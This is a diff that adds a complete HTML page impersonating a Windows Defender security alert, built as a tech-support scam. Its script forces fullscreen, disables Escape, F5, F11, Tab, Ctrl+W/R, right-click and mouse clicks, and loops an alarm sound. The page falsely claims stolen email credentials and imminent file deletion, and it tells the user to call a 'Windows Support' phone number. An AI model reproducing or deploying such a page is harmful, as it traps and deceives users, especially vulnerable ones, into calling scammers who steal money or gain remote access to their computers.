@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Windows Defender Security Warning</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100vw;
+      height: 100vh;
+      background: #e7eefc;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      user-select: none;
+      overflow: hidden;
+      cursor: none;
+    }
+    .overlay-blue {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      background: #1877d5;
+      color: #fff;
+      padding: 18px;
+      z-index: 999;
+      text-align: center;
+      font-size: 1.25em;
+      font-weight: 500;
+      box-shadow: 0 4px 10px #0003;
+    }
+    .center-window {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 10px 34px #0005;
+      width: 500px;
+      max-width: 97vw;
+      padding: 32px 34px 24px 34px;
+      z-index: 1000;
+      text-align: left;
+    }
+    .center-window h2 {
+      color: #2a4887;
+      font-weight: 600;
+      margin-bottom: 18px;
+      letter-spacing: 0.01em;
+    }
+    .threat {
+      color: #cc222a;
+      font-weight: bold;
+      margin-bottom: 8px;
+      font-size: 1.1em;
+    }
+    .icon-row {
+      display: flex;
+      gap: 22px;
+      justify-content: center;
+      margin-bottom: 19px;
+    }
+    .icon-row img {
+      height: 38px;
+      width: 38px;
+      filter: grayscale(0.5);
+    }
+    .block-note {
+      font-size: 1em;
+      color: #b21d1d;
+      background: #f7e3e3;
+      border: 1.5px solid #d89e9e;
+      border-radius: 6px;
+      padding: 10px 12px;
+      margin: 12px 0 22px 0;
+    }
+    .support {
+      color: #233a6a;
+      background: #e7eefc;
+      font-size: 1.08em;
+      margin: 0;
+    }
+    .buttons-row {
+      display: flex;
+      flex-direction: row-reverse;
+      gap: 18px;
+      justify-content: flex-end;
+      margin-top: 24px;
+    }
+    .btn {
+      background: #e9ecef;
+      border: 1.5px solid #7a92bd;
+      color: #133873;
+      padding: 8px 25px;
+      font-size: 1em;
+      border-radius: 3px;
+      outline: none;
+      cursor: none;
+      pointer-events: none;
+      opacity: 0.5;
+      font-weight: 500;
+    }
+    .ms-logo {
+      margin-right: 6px;
+      width: 27px;
+      vertical-align: middle;
+    }
+    @media (max-width:600px) {
+      .center-window { padding: 18px 8px 12px 8px; width: 97vw; }
+    }
+  </style>
+  <script>
+    // --- FULL SCREEN ---
+    function goFullscreen() {
+      let el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    }
+    window.onload = () => {
+      goFullscreen();
+      playAlert();
+    };
+    // --- Block user actions ---
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      const blockKeys = ['F11', 'F5', 'Escape', 'Tab'];
+      if (
+        blockKeys.includes(e.key) ||
+        (e.ctrlKey && ['w','r'].includes(e.key.toLowerCase()))
+      ) e.preventDefault();
+    });
+    document.addEventListener('mousedown', e => e.preventDefault());
+    document.onselectstart = () => false;
+    // --- Sound effect logic ---
+    let soundPlayed = false;
+    function playAlert() {
+      if (!soundPlayed) {
+        const audio = document.getElementById('alertSound');
+        if (audio) {
+          audio.volume = 0.35;
+          audio.play();
+          soundPlayed = true;
+        }
+      }
+    }
+    document.addEventListener('click', playAlert, { once: true });
+  </script>
+</head>
+<body>
+  <div class="overlay-blue">
+    <b>Windows-Defender - Security Warning</b><br>
+    * ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS *<br>
+    Your computer has alerted us that it has been infected with a DOSAttack Spyware. The following data has been compromised.<br>
+    &gt; Email Credentials
+  </div>
+  <div class="center-window">
+    <h2>Windows Defender Security Center</h2>
+    <div class="threat">App: Ads.financetrack(2).dll<br>
+      Threat Detected: DOSAttack Spyware
+    </div>
+    <div class="icon-row">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2d/Windows_Defender_logo.png" title="Defender Icon" alt="Defender Icon"/>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" title="Microsoft Logo" alt="Microsoft Logo"/>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/8c/Lock_icon.svg" title="Lock Icon" alt="Lock Icon"/>
+    </div>
+    <div class="block-note">
+      Access to this PC has been blocked for security reasons.<br>
+      <span class="support">
+        Contact Windows Support: <b>1-865-484-6972</b> (Toll Free)<br>
+      </span>
+      <small>
+        Note: If you think this Notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this Computer ID is flagged and is connected over the internet Servers, files and apps deletion may start any moment.
+      </small>
+    </div>
+    <div class="buttons-row">
+      <button class="btn">Allow</button>
+      <button class="btn">Deny</button>
+    </div>
+    <div style="margin-top:12px;">
+      <img class="ms-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
+      <span>Microsoft</span>
+    </div>
+  </div>
+  <!-- Alarm sound (royalty-free public URL) -->
+  <audio id="alertSound" src="https://cdn.pixabay.com/audio/2022/07/26/audio_124b9edab9.mp3" loop></audio>
+</body>
+</html>
